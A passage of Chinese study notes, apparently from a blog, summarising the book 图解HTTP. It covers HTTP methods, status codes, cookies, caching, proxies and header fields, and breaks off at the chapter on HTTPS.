等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号。</li><li>也可使用 data: 或 javascript: 这类指定数据或脚本程序的方案名。</li></ul></li><li>登录信息（认证）：指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项</li><li>服务器地址</li><li>服务器端口号</li><li>带层次的文件路径</li><li>查询字符串</li><li>片段标识符</li></ul></li></ul><h3 id="4-rfc%EF%BC%88request-for-comments%EF%BC%8C%E5%BE%81%E6%B1%82%E4%BF%AE%E6%AD%A3%E6%84%8F%E8%A7%81%E4%B9%A6%EF%BC%89" tabindex="-1">4 RFC（Request for Comments，征求修正意见书）</h3><p>RFC是互联网的设计文档，一般应用程序要遵照RFC确定的标准实现</p><h2 id="%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%AE%80%E5%8D%95%E7%9A%84http%E5%8D%8F%E8%AE%AE" tabindex="-1">第二章 简单的HTTP协议</h2><ul><li><p>HTTP 协议用于客户端和服务器端之间的通信</p></li><li><p>通过请求和响应的交换达成通信</p><ul><li>客户端发送请求报文</li><li>服务器返回相应报文</li></ul></li><li><p>HTTP是不保存状态的协议，即无状态（stateless）协议。</p><ul><li>HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</li></ul></li><li><p>请求URI定位资源</p><ul><li>HTTP 协议使用 URI 定位互联网上的资源。正是因为 URI 的特定功能，在互联网上任意位置的资源都能访问到。</li></ul></li><li><p>告知服务器意图的HTTP方法</p><ul><li>GET：获取资源</li><li>POST：传输实体主体</li><li>PUT：传输文件</li><li>HEAD：获得报文首部。HEAD 方法和 GET 方法一样，只是不返回报文主体部分。用于确认URI 的有效性及资源更新的日期时间</li><li>DELETE：删除文件</li><li>OPTIONS：询问支持的方法，OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。</li><li>TRACE：追踪路径，让 Web 服务器端将之前的请求通信环回给客户端的方法。</li><li>CONNECT：要求用隧道协议连接代理<ul><li>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输</li></ul></li></ul></li><li><p>持久连接节省通信量</p><ul><li>持久连接的特点：只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</li><li>持久连接的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</li><li>持久连接使得多数请求以流水线化（pipelining）方式发送成为可能。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。</li></ul></li><li><p>使用Cookie的状态管理</p><ul><li>Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。<ul><li>Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</li><li>服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</li></ul></li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-http%E6%8A%A5%E6%96%87%E5%86%85%E7%9A%84http%E4%BF%A1%E6%81%AF" tabindex="-1">第三章 HTTP报文内的HTTP信息</h2><ul><li>用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。</li><li>HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。</li></ul><h3 id="1-%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84" tabindex="-1">1 报文结构</h3><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/3_1.jpg" alt><br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/3_2.jpg" alt></p><ul><li>请求报文和响应报文的<strong>首部</strong>由以下数据组成<ul><li>请求行：包含用于请求的方法，请求URI和HTTP的版本</li><li>状态行：包含表明响应结果的状态码，原因短语和HTTP版本</li><li>首部字段：包含表示请求和响应的各种条件和属性的各类首部<ul><li>一般有4种首部：通用首部，请求首部，响应首部，实体首部</li></ul></li><li>其它：可能包含HTTP的RFC里未定义的首部（Cookie等）</li></ul></li></ul><h3 id="2-%E7%BC%96%E7%A0%81%E6%8F%90%E5%8D%87%E4%BC%A0%E8%BE%93%E6%95%88%E7%8E%87" tabindex="-1">2 编码提升传输效率</h3><ul><li><p>HTTP在传输数据时可以按照数据原貌进行直接传输，也可以通过在传输过程中编码提升传输效率</p></li><li><p>在传输时编码，可以处理大量访问请求，但编码解码需要CPU来完成，消耗更多CPU资源</p></li><li><p>报文：是HTTP通信种的基本单位，由8位组字节流则称，通过HTTP通信传输</p></li><li><p>实体：作为请求或响应的有效载荷数据被传输，其内容由实体首部和实体主体组成</p></li><li><p>HTTP报文的主体用于传输请求或响应主体，通常报文主体等于实体主体，但实体主体可能会进行编码操作</p><ul><li>常用内容编码：<ul><li>gzip（GNU zip）</li><li>compress（UNIX 系统的标准压缩）</li><li>deflate（zlib）</li><li>identity（不进行编码）</li></ul></li></ul></li><li><p>分块传输编码：将实体主体分块传送</p></li></ul><h3 id="3-%E5%8F%91%E9%80%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%9A%E9%83%A8%E5%88%86%E5%AF%B9%E8%B1%A1%E9%9B%86%E5%90%88" tabindex="-1">3 发送多种数据的多部分对象集合</h3><ul><li>发送邮件时，可以在邮件中写入文字并添加多份附件，这是因为采用了MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制，其允许邮件处理文本，图片，视频等多个不同类型的数据</li><li>HTTP中也采纳了多部份对象集合，发送一份报文主体内可包含多类型实体<ul><li>HTTP 报文中使用多部分对象集合时，需要在首部字段里加上Content-type。</li></ul></li></ul><h3 id="4-%E8%8E%B7%E5%8F%96%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E7%9A%84%E8%8C%83%E5%9B%B4%E8%AF%B7%E6%B1%82" tabindex="-1">4 获取部分内容的范围请求</h3><p>执行范围请求时，会使用首部字段Range来指定资源的byte范围</p><ul><li><p>5001-10000字节：Range: bytes=5001-10000</p></li><li><p>从5001字节之后：Range: bytes=5001-</p></li><li><p>从一开始到 3000 字节和 5000~7000 字节的多重范围：Range: bytes=-3000, 5000-7000</p></li><li><p>针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 Content-Type标明 multipart/byteranges 后返回响应报文。</p></li><li><p>如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。</p></li></ul><h3 id="5-%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86%E8%BF%94%E5%9B%9E%E6%9C%80%E5%90%88%E9%80%82%E7%9A%84%E5%86%85%E5%AE%B9" tabindex="-1">5 内容协商返回最合适的内容</h3><ul><li>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。<ul><li>Accept</li><li>Accept-Charset</li><li>Accept-Encoding</li><li>Accept-Language</li><li>Content-Language</li></ul></li><li>内容协商技术有以下 3 种类型<ul><li>服务器驱动协商（Server-driven Negotiation）<ul><li>由服务器端进行内容协商。以请求的首部字段为参考，在服务器端自动处理。</li></ul></li><li>客户端驱动协商（Agent-driven Negotiation）<ul><li>由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用 JavaScript 脚本在 Web 页面上自动进行上述选择。比如按 OS 的类型或浏览器类型，自行切换成 PC 版页面或手机版页面。</li></ul></li><li>透明协商（Transparent Negotiation）<ul><li>是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法。</li></ul></li></ul></li></ul><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81" tabindex="-1">第四章 返回结果的HTTP状态码</h2><p>HTTP状态码负责表示客户端 HTTP请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。</p><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational(信息性状态码)</td><td>接受的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求错误</td></tr></tbody></table><h3 id="1-2xx%E6%88%90%E5%8A%9F" tabindex="-1">1 2XX成功</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>200 OK</td><td>表示从客户端发来的请求在服务器端被正常处理了</td></tr><tr><td>204 No Content</td><td>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分，即服务器没有资源可以返回。</td></tr><tr><td>206 Partial content</td><td>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。</td></tr></tbody></table><h3 id="2-3xx%E9%87%8D%E5%AE%9A%E5%90%91" tabindex="-1">2 3XX重定向</h3><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确地处理请求</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>301 Moved Permanently</td><td>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指向的URI</td></tr><tr><td>302 Found</td><td>临时重定向。该状态码表示请求的资源已经被分配了新的URI，希望用户使用新的URI访问</td></tr><tr><td>303 See Other</td><td>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。<br>303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。</td></tr><tr><td>304 Not Modified</td><td>该状态码表示客户端发送附带条件的请求 A 时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。</td></tr><tr><td>307 Temporary Redirect</td><td>临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET，但实际使用时大家并不遵守。307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况</td></tr></tbody></table><h3 id="3-4xx%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF" tabindex="-1">3 4XX客户端错误</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>400 Bad Request</td><td>该状态码表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后再次发送请求</td></tr><tr><td>401 unauthorized</td><td>该状态码表示发送的请求需要有通过HTTP认证（BASIC认证，DIGEST认证）的认证信息。若之前已进行过一次请求，则表示用户认证失败<br>返回含有401的响应必须包含一个使用户被请求资源的WWW-Authenticate首部以质询（challenge）用户信息。当浏览器初次接收到401响应时，会弹出认证用的对话窗口</td></tr><tr><td>403 Forbidden</td><td>该状态码表示对请求资源的访问被服务器拒接了。服务器端没有必要给出拒绝的详细理由，但可以在实体的主体部分对原因进行描述。<br>未获得文件系统的访问权限，访问权限出现问题等情况都有可能发生403</td></tr><tr><td>404 Not Found</td><td>该状态码表示服务器上无法找到请求的资源，除此之外，也可以在服务器端拒绝请求且不想说明理由时使用</td></tr></tbody></table><h3 id="4-5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF" tabindex="-1">4 5XX服务器错误</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>500 Internal Server Error</td><td>改状态码表示服务器端在执行请求时发生了错误，可能是Web应用存在的bug或某些临时的故障</td></tr><tr><td>503 Service Unavailable</td><td>该状态码表示服务器暂时处于超负载或真正进行停机维护，现在无法处理请求。如果实现得知解决上述状况需要的时间，最好写入Retry-After首部字段再返回给客户端</td></tr></tbody></table><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%B8%8Ehttp%E5%8D%8F%E4%BD%9C%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8" tabindex="-1">第五章 与HTTP协作的Web服务器</h2><p>一台Web服务器可搭建多个独立域名的Web网站，也可作为通信路径上的中转服务器提升传输效率。</p><h3 id="1-%E7%94%A8%E5%8D%95%E5%8F%B0%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D" tabindex="-1">1 用单台虚拟主机实现多个域名</h3><ul><li>HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点，比如提供Web托管服务的供应商，这里使用了虚拟主机(Virtual Host,又称虚拟服务器)功能</li><li>在相同的IP地址下，由于虚拟主机可以寄存多个不同的主机名和域名的Web网站，因此在HTTP请求中，必须在Host首部内完整指定主机名或域名的URI</li></ul><h3 id="2-%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E7%A8%8B%E5%BA%8F%EF%BC%9A%E4%BB%A3%E7%90%86%EF%BC%8C%E7%BD%91%E5%85%B3%EF%BC%8C%E9%9A%A7%E9%81%93" tabindex="-1">2 通信数据转发程序：代理，网关，隧道</h3><p>HTTP通信时，除客户端和服务器外，还有一些用于通信数据转发的应用程序，如代理，网关和隧道，其可以配合服务器工作</p><ul><li>代理：是一种具有转发功能的应用程序，扮演了服务器和客户端的“中间人”角色，接受客户端发送的请求并转发给服务器，同时也接收服务器返回的响应转发给客户端</li><li>网关：网关是转发其他服务器通信数据的服务器，接收从客户端发来的请求时，它将像自己拥有资源的源服务器一样对请求进行处理，有时客户端可能不会察觉自己的通信目标是一个网关</li><li>隧道：是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序</li></ul><h4 id="%E4%BB%A3%E7%90%86" tabindex="-1">代理</h4><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/5_1.jpg" alt></p><ul><li><p>代理服务器的基本行为就是接受客户端发送的请求后转发给其它服务器，代理不改变请求URI，会直接发送给前方持有资源的目标服务器</p></li><li><p>持有资源实体的服务器称为源服务器，从源服务器返回的响应经过代理服务器后再传给客户端</p></li><li><p>在HTTP通信过程中，可以级联多台代理服务器，转发时，需要附加Via首部字段以标记出经过的主机信息</p></li><li><p>使用代理服务器的理由</p><ul><li><ol><li>利用缓存技术减少网络带宽的流量</li></ol></li><li><ol start="2"><li>组织内部针对特定网络的访问控制</li></ol></li><li><ol start="3"><li>以后去访问日志为主要目的等</li></ol></li></ul></li><li><p>代理方法基准分类：</p><ul><li><ol><li>是否使用缓存：缓存代理</li></ol><ul><li>代理转发响应时，缓存代理(Caching Proxy)会预先将资源的副本(缓存)保存在代理服务器上</li><li>当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将缓存的资源返回</li></ul></li><li><ol start="2"><li>是否会修改报文：透明代理</li></ol><ul><li>转发请求或响应时，不对报文做任何加工的代理类型称为透明代理(Transparent Proxy)，反之称为非透明代理</li></ul></li></ul></li></ul><h4 id="%E7%BD%91%E5%85%B3" tabindex="-1">网关</h4><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/5_2.jpg" alt></p><ul><li>网关的工作机制与代理相似，并且网关能使通信线路上的服务器提供非HTTP协议服务</li><li>利用网关可以提高通信的安全性，可以在客户端和网关之间的通信线路上加密以确保连接的安全。<ul><li>例如：网关可以连接数据库，使用SQL语句查询数据</li></ul></li></ul><h4 id="%E9%9A%A7%E9%81%93" tabindex="-1">隧道</h4><ul><li>隧道可以按要求建立一条与其它服务器的通信线路，届时使用SSL等加密手段进行通信。</li><li>隧道的目的：确保客户端和服务器能进行安全的通信</li><li>隧道本身不会解析HTTP请求，隧道会在通信双方断开连接时结束</li></ul><h3 id="3-%E4%BF%9D%E5%AD%98%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98" tabindex="-1">3 保存资源的缓存</h3><ul><li>缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，节省了通信流量和通信时间</li><li>缓存服务器是代理服务器的一种，属于缓存代理类型</li></ul><h4 id="%E7%BC%93%E5%AD%98%E7%9A%84%E6%9C%89%E6%95%88%E6%9C%9F%E9%99%90" tabindex="-1">缓存的有效期限</h4><ul><li>当源服务器上的资源更新时，如果还是使用不变的缓存，只会返回旧资源</li><li>因此，即使存在缓存，也会因为客户端的要求，缓存的有效期等因素，向源服务器确认资源的有效性，如判断缓存失效，则重新获取</li></ul><h4 id="%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%BC%93%E5%AD%98" tabindex="-1">客户端的缓存</h4><ul><li>缓存不仅可以在缓存服务器中，也可以在客户端浏览器中</li><li>浏览器缓存如果有效，则不必再向服务器请求相同的资源，可以从本地磁盘直接读取</li></ul><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-http%E9%A6%96%E9%83%A8" tabindex="-1">第六章 HTTP首部</h2><h3 id="1-http%E6%8A%A5%E6%96%87%E9%A6%96%E9%83%A8" tabindex="-1">1 HTTP报文首部</h3><ul><li>首部内容为客户端和服务器分别处理请求和相应所提供的信息</li><li>在请求中，HTTP报文由方法，URI，HTTP版本，HTTP首部字段等部分构成<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_1.jpg" alt></li><li>在响应中，HTTP报文由HTTP版本，状态码(数字和原因短语)，HTTP首部字段3部分组成<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_2.jpg" alt></li></ul><h3 id="2-http%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">2 HTTP首部字段</h3><ul><li><p>HTTP首部字段传递重要信息：给浏览器和服务器提供报文主体大小，所使用的语言，主体信息等内容</p></li><li><p>HTTP首部字段结构：由首部字段名和字段值构成，中间用冒号分隔</p><ul><li>例如：<ul><li>Content-Type:text/html 该字段表示报文的主体对象类型</li><li>Keep-Alive : timeout=15,max=100 字段值可以有多个</li></ul></li></ul></li><li><p>4种HTTP首部字段类型</p><ul><li>通用首部字段 General Header Fields：请求报文和响应报文都会使用的首部</li><li>请求首部字段 Request Header Fields：从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容，客户端信息，相应内容相关优先级等信息</li><li>响应首部字段 Response Header Fields：从服务器端想客户端返回响应报文时使用的首部，补充了相应的附加内容，也会要求客户端附加额外的内容信息</li><li>实体首部字段 Entity Header Fields：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容·更新时间等与实体有关的信息。</li></ul></li><li><p>HTTP/1.1首部字段一览，HTTP/1.1共定义了47种首部字段<br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_3.jpg" alt><br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_4.jpg" alt><br><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/6_5.jpg" alt></p></li><li><p>在HTTP协议种使用的首部字段，不限于RFC2616中的47种，还有Cookie，Set-Cookie等使用频率很高的字段，这些非正式字段统一归纳在 RFC4229 HTTP Header Field Registrations 中</p></li></ul><h3 id="3-http%2F1.1-%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">3 HTTP/1.1 通用首部字段</h3><ul><li><p>Cache-Control：操作缓存的机制</p><ul><li>指令的参数是可选的，多个指令之间用&quot;,&quot;隔开，具体指令查阅资料</li><li>响应时控制缓存的指令<ul><li><code>Cache-Control:public</code> 表示所有用户都可以利用缓存</li><li><code>Cache-Control:private</code> 表示指定用户都可以利用缓存</li><li><code>Cache-Control:no-cache</code> 缓存服务器不能对资源进行缓存</li><li><code>Cache-Control:no-cache=Location</code> 客户端不能对资源进行缓存</li></ul></li><li>请求时控制缓存的指令<ul><li><code>Cache-Control:no-cache</code> 表示请求时不要缓存过的，这样做可以防止过期资源</li><li><code>Cache-Control:max-age=604800(秒)</code>当缓存时间比设定时间小则接收缓存资源，当max-age=0时缓存服务器需要将请求转发给源服务器</li><li><code>min-fresh=60(单位：秒)</code>:要求缓存服务器返回至少还未过指定时间的缓存资源</li><li><code>max-stale</code>可指示缓存资源，即使过期也照常接收只要仍处于 max-stale 指定的时间内，仍旧会被客户端接收。</li><li><code>only-if-cached</code>表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回,如缓存服务器本地无缓存，返回504</li><li><code>must-revalidate</code>代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效</li></ul></li><li>共同意思<ul><li><code>Cache-Control:no-store</code> 表示有机密消息，请求和响应都不能缓存</li></ul></li></ul></li><li><p>Connection:该字段具有两个作用</p><ul><li>控制不再转发给代理的首部字段<code>Connection: 不再转发的首部字段名</code></li><li>管理持久连接<code>Connection: close</code> or <code>Connection: Keep-Alive</code></li></ul></li><li><p>Date</p><ul><li>首部字段Data表明创建HTTP报文的日期和时间</li><li>HTTP/1.1使用在RFC1123种规定的日期时间的格式，如下示例</li><li><code>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></li></ul></li><li><p>Pragma</p><ul><li>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。</li><li>规范定义的形式唯一<code>Pragma: no-cache</code>,与cache字段共用即可</li></ul></li><li><p>Trailer</p><ul><li>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。</li></ul></li><li><p>Transfer-Encoding:规定了传输报文主体时采用的编码方式</p><ul><li>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</li></ul></li><li><p>Upgrade:用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p></li><li><p>Via:追踪客户端与服务器之间的请求和响应报文的传输路径。</p></li><li><p>Warning:该首部通常会告知用户一些与缓存相关的问题的警告。</p><ul><li>格式:<code>Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></li></ul></li></ul><h3 id="4-%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">4 请求首部字段</h3><ul><li><p>Accept：Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。 可使用 type/subtype 这种形式，一次指定多种媒体类型</p><ul><li><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></li></ul></li><li><p>Accept-Charset:通知服务器用户代理支持的字符集及字符集的相对优先顺序。</p><ul><li><code>Accept-Charset: iso-8859-5, unicode-1-1;q=0.8</code></li></ul></li><li><p>Accept-Encoding:用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。</p><ul><li><code>Accept-Encoding: gzip, deflate</code></li></ul></li><li><p>Accept-Language:告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。</p><ul><li><code>Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3</code></li></ul></li><li><p>Authorization:告知服务器，用户代理的认证信息（证书值）。</p></li><li><p>Expect:告知服务器，期望出现的某种特定行为</p></li><li><p>From:告知服务器使用用户代理的用户的电子邮件地址。</p></li><li><p>Host:告知服务器，请求的资源所处的互联网主机名和端口号。</p></li><li><p>If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求</p></li></ul><h3 id="5-%E5%93%8D%E5%BA%94%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">5 响应首部字段</h3><ul><li><p>Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none</p></li><li><p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p></li><li><p>首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。</p><ul><li>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</li><li>弱 ETag 值只用于提示资源是否相同。</li></ul></li><li><p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI位置不同的资源。基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p></li><li><p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用</p></li><li><p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。<code>Server: Apache/2.2.6 (Unix) PHP/5.2.5</code></p></li><li><p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate</p></li></ul><h3 id="6-%E5%AE%9E%E4%BD%93%E9%A6%96%E9%83%A8%E5%AD%97" tabindex="-1">6 实体首部字</h3><ul><li><p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。<code>Allow: GET, HEAD</code></p></li><li><p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分<br>选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行<br>的压缩。<code>Content-Encoding: gzip</code></p></li><li><p>首部字段 Content-Language 会告知客户端，实体主体使用的自然语<br>言（指中文或英文等语言）。</p></li><li><p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p></li><li><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</p></li><li><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小</p></li><li><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。</p></li><li><p>首部字段 Expires 会将资源失效的日期告知客户端。</p></li><li><p>首部字段 Last-Modified 指明资源最终修改的时间。</p></li></ul><h3 id="7-%E4%B8%BAcookie%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">7 为Cookie服务的首部字段</h3><table><thead><tr><th>首部字段名</th><th>说明</th><th>首部类型</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>开始状态管理所使用的Cookie信息</td><td>响应首部字段</td></tr><tr><td>Cookie</td><td>服务器接收到的Cookie信息</td><td>请求首部字段</td></tr></tbody></table><ul><li><p>Set-Cookie：当服务器准备开始管理客户端的状态时，会事先告知各种信息。</p></li><li><p>set-Cookie字段的属性</p><ul><li>NAME=VALUE：赋予Cookie的名称和其值（必需项）</li><li>expires=DATE Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</li><li>path=PATH 将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</li><li>domain=域名 作为Cookie适用对象的域名 （若不指定则默认为创建Cookie的服务器的域名）</li><li>Secure 仅在HTTPS安全通信时才会发送Cookie</li><li>HttpOnly 加以限制，使Cookie不能被JavaScript脚本访问</li></ul></li><li><p>Cookie：首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。</p></li></ul><h3 id="8-%E5%85%B6%E4%BB%96%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5" tabindex="-1">8 其他首部字段</h3><ul><li><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击</p></li><li><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p></li><li><p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的</p></li><li><p>协议中对 X- 前缀的废除</p><ul><li>在 HTTP 等多种协议中，通过给非标准参数加上前缀 X-，来区别于标准参数，并使那些非标准的参数作为扩展变成可能。但是这种简单粗暴的做法有百害而无一益，因此在“RFC 6648 - Deprecating the “X-” Prefix and Similar Constructs in Application Protocols”中提议停止该做法。</li><li>然而，对已经在使用中的 X- 前缀来说，不应该要求其变更。</li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%A1%AE%E4%BF%9Dweb%E5%AE%89%E5%85%A8%E7%9A%84https" tabindex="-1">第七章 确保Web安全的HTTPS</h2><h3 id="7.1-http%E7%9A%84%E7%BC%BA%E7%82%B9" tabindex="-1">7.1 